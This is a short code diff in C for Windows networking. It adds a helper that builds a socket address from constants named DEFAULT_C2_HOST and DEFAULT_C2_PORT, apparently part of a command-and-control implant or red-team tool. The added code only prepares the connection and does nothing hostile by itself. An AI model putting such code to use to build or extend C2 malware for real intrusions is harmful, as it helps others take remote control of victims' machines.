@@ -94,3 +94,13 @@ VOID NetworkShutdown(VOID)
 	WSACleanup();
 	G_WinsockInitialized = FALSE;
 }
+
+struct sockaddr_in GetSockAddr()
+{
+	struct sockaddr_in sa = { 0 };
+	sa.sin_family = AF_INET;
+	sa.sin_port = (USHORT)wcstoul(DEFAULT_C2_PORT, L'\0', 10);
+	InetPtonW(AF_INET, DEFAULT_C2_HOST, &(sa.sin_addr.S_un.S_addr));
+
+	return sa;
+}
